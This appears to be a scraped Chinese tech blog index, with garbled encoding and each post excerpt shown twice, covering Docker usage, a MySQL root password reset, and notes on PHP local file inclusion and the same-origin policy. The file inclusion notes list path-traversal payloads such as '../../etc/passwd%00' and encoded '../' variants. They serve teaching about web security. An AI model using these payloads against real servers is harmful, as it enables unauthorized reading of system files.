<span class="token comment">#run è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œ-t åˆ›é€ ä¸€ä¸ªä¼ªTTY, -iè¡¨ç¤ºå§STDINæ‰“å¼€ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯è®©ç»ˆç«¯å¯ç”¨ï¼Œubuntuæ˜¯æŒ‡é•œåƒåï¼Œ/bin/bashæ˜¯è¦è¿è¡Œçš„å‘½ä»¤ã€‚exitæˆ–è€…Ctrl+d é€€å‡º</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#æŸ¥çœ‹æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œ</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#å¯åŠ¨é‚£ä¸ªå®¹å™¨</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#å†æ¬¡ç™»å½•ä¸Šå»ï¼Œä¸èƒ½ç”¨runï¼Œå¦åˆ™ä¼šæ–°å»ºä¸€ä¸ªå®¹å™¨</span>

ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ç”¨ä¸€ä¸ªå‘½ä»¤ä»£æ›¿ï¼š
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a è¡¨ç¤ºattachï¼Œ -i è¡¨ç¤ºå¼€å¯stdin</span>

å¦‚æœæƒ³å¤šè¿shellï¼Œattachå‘½ä»¤ä¼šå¡ï¼Œå¯ä»¥ç”¨execè®©è¿™ä¸ªå®¹å™¨å†è¿è¡Œä¸€ä¸ªbash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#åˆ é™¤å®¹å™¨</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#åˆ é™¤æ‰€æœ‰é€€å‡ºçŠ¶æ€çš„å®¹å™¨</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmpçš„80ç«¯å£æ˜ å°„åˆ°8888ç«¯å£ï¼Œå¹¶ä¸”å¼€å¯ä¸€ä¸ªäº¤äº’çš„shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘æƒ³è¦dockeråœ¨åå°è¿è¡Œï¼Œæ¯æ¬¡éƒ½å¯ä»¥è¿›å»ä¿®æ”¹ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯æŸ¥äº†èµ„æ–™ä¸å¤ªå¦‚æ„ï¼Œdockeråå°è¿è¡Œçš„æ—¶å€™ï¼Œä»–é‡Œé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç¨‹åºä¸€ç›´åœ¨è¿è¡Œã€‚ä¸ºäº†å·æ‡’æˆ‘ç”¨äº†screenï¼Œç„¶å<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>ï¼Œè¿™æ ·é€€å‡ºä¹‹åä½¿ç”¨<code>docker exec -t -i 35f89fd74804 /bin/bash</code>ã€‚çªç„¶æ„Ÿè§‰å¥½æ–¹ä¾¿=ã€‚=</p>
<pre class="line-numbers language-none"><code class="language-none">ç»™dockerèµ·ä¸€ä¸ªåå­—ä¹‹åå¯ä»¥è¿™æ ·æ‰§è¡Œå‘½ä»¤
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>dockerä¿®æ”¹äº†éƒ¨åˆ†æ–‡ä»¶ä¹‹åå¯ä»¥å…ˆé€€å‡ºï¼Œä½¿å¾—dockerçš„containeræ˜¯exitedçŠ¶æ€ï¼Œç„¶ådocker commit 3d1d1748aaeb web è¿™æ ·ä¿å­˜ï¼Œä¸‹æ¬¡ç›´æ¥è¿è¡Œwebè¿™ä¸ªimageså³å¯ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨åšä¸€ä¸ªlnmpçš„dockerï¼Œä½¿ç”¨ubuntu12.04,lnmp1.3ç‰ˆæœ¬ï¼Œdockerfileå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>ï¼Œåœ¨vpsä¸Šé¢ç­‰ç­‰å°±okï¼Œæœ€åå¯ä»¥çœ‹åˆ°æ–°ç”Ÿæˆçš„imagesï¼Œ<code>docker start -it IMAGEID bash</code>åˆ é™¤ä¸€äº›ä¸œè¥¿ï¼Œmysqlè¿›ä¸å»å¯ä»¥è¿™æ ·ä¿®æ”¹</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(å®¹å™¨): åº”ç”¨åœ¨å†…éƒ¨è·‘ï¼Œæœ‰è‡ªå·±å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿã€‚</li>
<li>Docker image(é•œåƒ): åº”ç”¨ä»£ç å„ç§åº“å’Œæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯imageï¼Œéœ€è¦åŠ è½½åˆ°å®¹å™¨æ‰èƒ½è¿è¡Œã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#åˆ—å‡ºcontainerå’Œimageçš„æ•°é‡ï¼Œå®¿ä¸»æ“ä½œç³»ç»Ÿç­‰</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
<span class="token comment">#run è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œ-t åˆ›é€ ä¸€ä¸ªä¼ªTTY, -iè¡¨ç¤ºå§STDINæ‰“å¼€ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯è®©ç»ˆç«¯å¯ç”¨ï¼Œubuntuæ˜¯æŒ‡é•œåƒåï¼Œ/bin/bashæ˜¯è¦è¿è¡Œçš„å‘½ä»¤ã€‚exitæˆ–è€…Ctrl+d é€€å‡º</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#æŸ¥çœ‹æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œ</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#å¯åŠ¨é‚£ä¸ªå®¹å™¨</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#å†æ¬¡ç™»å½•ä¸Šå»ï¼Œä¸èƒ½ç”¨runï¼Œå¦åˆ™ä¼šæ–°å»ºä¸€ä¸ªå®¹å™¨</span>

ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ç”¨ä¸€ä¸ªå‘½ä»¤ä»£æ›¿ï¼š
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a è¡¨ç¤ºattachï¼Œ -i è¡¨ç¤ºå¼€å¯stdin</span>

å¦‚æœæƒ³å¤šè¿shellï¼Œattachå‘½ä»¤ä¼šå¡ï¼Œå¯ä»¥ç”¨execè®©è¿™ä¸ªå®¹å™¨å†è¿è¡Œä¸€ä¸ªbash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#åˆ é™¤å®¹å™¨</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#åˆ é™¤æ‰€æœ‰é€€å‡ºçŠ¶æ€çš„å®¹å™¨</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmpçš„80ç«¯å£æ˜ å°„åˆ°8888ç«¯å£ï¼Œå¹¶ä¸”å¼€å¯ä¸€ä¸ªäº¤äº’çš„shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘æƒ³è¦dockeråœ¨åå°è¿è¡Œï¼Œæ¯æ¬¡éƒ½å¯ä»¥è¿›å»ä¿®æ”¹ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯æŸ¥äº†èµ„æ–™ä¸å¤ªå¦‚æ„ï¼Œdockeråå°è¿è¡Œçš„æ—¶å€™ï¼Œä»–é‡Œé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç¨‹åºä¸€ç›´åœ¨è¿è¡Œã€‚ä¸ºäº†å·æ‡’æˆ‘ç”¨äº†screenï¼Œç„¶å<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>ï¼Œè¿™æ ·é€€å‡ºä¹‹åä½¿ç”¨<code>docker exec -t -i 35f89fd74804 /bin/bash</code>ã€‚çªç„¶æ„Ÿè§‰å¥½æ–¹ä¾¿=ã€‚=</p>
<pre class="line-numbers language-none"><code class="language-none">ç»™dockerèµ·ä¸€ä¸ªåå­—ä¹‹åå¯ä»¥è¿™æ ·æ‰§è¡Œå‘½ä»¤
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>dockerä¿®æ”¹äº†éƒ¨åˆ†æ–‡ä»¶ä¹‹åå¯ä»¥å…ˆé€€å‡ºï¼Œä½¿å¾—dockerçš„containeræ˜¯exitedçŠ¶æ€ï¼Œç„¶ådocker commit 3d1d1748aaeb web è¿™æ ·ä¿å­˜ï¼Œä¸‹æ¬¡ç›´æ¥è¿è¡Œwebè¿™ä¸ªimageså³å¯ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨åšä¸€ä¸ªlnmpçš„dockerï¼Œä½¿ç”¨ubuntu12.04,lnmp1.3ç‰ˆæœ¬ï¼Œdockerfileå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>ï¼Œåœ¨vpsä¸Šé¢ç­‰ç­‰å°±okï¼Œæœ€åå¯ä»¥çœ‹åˆ°æ–°ç”Ÿæˆçš„imagesï¼Œ<code>docker start -it IMAGEID bash</code>åˆ é™¤ä¸€äº›ä¸œè¥¿ï¼Œmysqlè¿›ä¸å»å¯ä»¥è¿™æ ·ä¿®æ”¹</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/09/25/whitehat-talk-web-security.html" >ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-09-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰"></a>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰</h3><p>æ–‡ä»¶åŒ…å«å¯èƒ½ä¼šå‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼Œå¸¸è§çš„å‡½æ•°å¦‚ä¸‹ï¼š<br><code>PHP: include()ã€include_once()ã€require()ã€require_once()ã€fopen()ã€readfile()</code></p>
<p>æ–‡ä»¶åŒ…å«æ˜¯PHPçš„ä¸€ç§å¸¸è§ç”¨æ³•ï¼Œä¸»è¦ç”±å››ä¸ªå‡½æ•°ç»„æˆï¼š</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯txtæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ï¼Œè¿œç¨‹URLç­‰éƒ½ä¼šä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p>
<p>èƒ½å¤Ÿæ‰“å¼€å¹¶ä¸”åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰</p>
<p>PHPè¯­è¨€æ˜¯ç”±Cè¯­è¨€å®ç°çš„ï¼Œå› æ­¤ä½¿ç”¨äº†Cè¯­è¨€ä¸­ä¸€äº›å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ0å­—èŠ‚ï¼ˆ\x00ï¼‰è®²ä½œä¸ºå­—ç¬¦ä¸²ç»“æŸç¬¦ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åŠ ä¸€ä¸ª0å­—èŠ‚ï¼Œæˆªæ–­fileå˜é‡åé¢çš„å­—ç¬¦ä¸²ï¼Œå³<br><code>../../etc/passwd\0</code>ï¼Œåœ¨getè¯·æ±‚çš„æ—¶å€™è¿›è¡ŒUrlencodeï¼Œå˜æˆ<code>../../etc/passwd%00</code>ã€‚</p>
<p>å¦‚æœç¦ç”¨äº†0å­—èŠ‚å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦0å­—èŠ‚è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ã€‚ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowsä¸‹256å­—èŠ‚ï¼ŒLinuxä¸‹4096å­—èŠ‚ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦ä¸²å°†ä¼šè¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡å¦‚ä¸‹æ„é€ :<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f ç­‰åŒäº ../</li>
<li>%2e%2e/ åŒä¸Š</li>
<li>..%2f åŒä¸Š</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255cç­‰åŒäº..\</li>
</ul>
	

	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰"></a>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰</h3><p>æ–‡ä»¶åŒ…å«å¯èƒ½ä¼šå‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼Œå¸¸è§çš„å‡½æ•°å¦‚ä¸‹ï¼š<br><code>PHP: include()ã€include_once()ã€require()ã€require_once()ã€fopen()ã€readfile()</code></p>
<p>æ–‡ä»¶åŒ…å«æ˜¯PHPçš„ä¸€ç§å¸¸è§ç”¨æ³•ï¼Œä¸»è¦ç”±å››ä¸ªå‡½æ•°ç»„æˆï¼š</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯txtæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ï¼Œè¿œç¨‹URLç­‰éƒ½ä¼šä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p>
<p>èƒ½å¤Ÿæ‰“å¼€å¹¶ä¸”åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰</p>
<p>PHPè¯­è¨€æ˜¯ç”±Cè¯­è¨€å®ç°çš„ï¼Œå› æ­¤ä½¿ç”¨äº†Cè¯­è¨€ä¸­ä¸€äº›å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ0å­—èŠ‚ï¼ˆ\x00ï¼‰è®²ä½œä¸ºå­—ç¬¦ä¸²ç»“æŸç¬¦ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åŠ ä¸€ä¸ª0å­—èŠ‚ï¼Œæˆªæ–­fileå˜é‡åé¢çš„å­—ç¬¦ä¸²ï¼Œå³<br><code>../../etc/passwd\0</code>ï¼Œåœ¨getè¯·æ±‚çš„æ—¶å€™è¿›è¡ŒUrlencodeï¼Œå˜æˆ<code>../../etc/passwd%00</code>ã€‚</p>
<p>å¦‚æœç¦ç”¨äº†0å­—èŠ‚å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦0å­—èŠ‚è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ã€‚ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowsä¸‹256å­—èŠ‚ï¼ŒLinuxä¸‹4096å­—èŠ‚ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦ä¸²å°†ä¼šè¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡å¦‚ä¸‹æ„é€ :<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f ç­‰åŒäº ../</li>
<li>%2e%2e/ åŒä¸Š</li>
<li>..%2f åŒä¸Š</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255cç­‰åŒäº..\</li>
</ul>
	
	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/08/29/csrf.html" >CSRF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-08-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚<br>åªè¦<strong>åè®®</strong>ã€<strong>ç«¯å£</strong>ã€<strong>ä¸»æœº</strong>ä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚</p>
<p>å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š</p>
<ul>
<li>ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚</li>
<li>ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´</li>
<li>Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚</li>
</ul>
<p>æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple request<br>å½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥<code>Access-Control-</code>å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š</p>
<ul>
<li>Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚<br>åªè¦<strong>åè®®</strong>ã€<strong>ç«¯å£</strong>ã€<strong>ä¸»æœº</strong>ä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚</p>
<p>å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š</p>
<ul>
<li>ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚</li>
<li>ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´</li>
<li>Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚</li>
</ul>
<p>æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple request<br>å½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥<code>Access-Control-</code>å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š</p>
<ul>
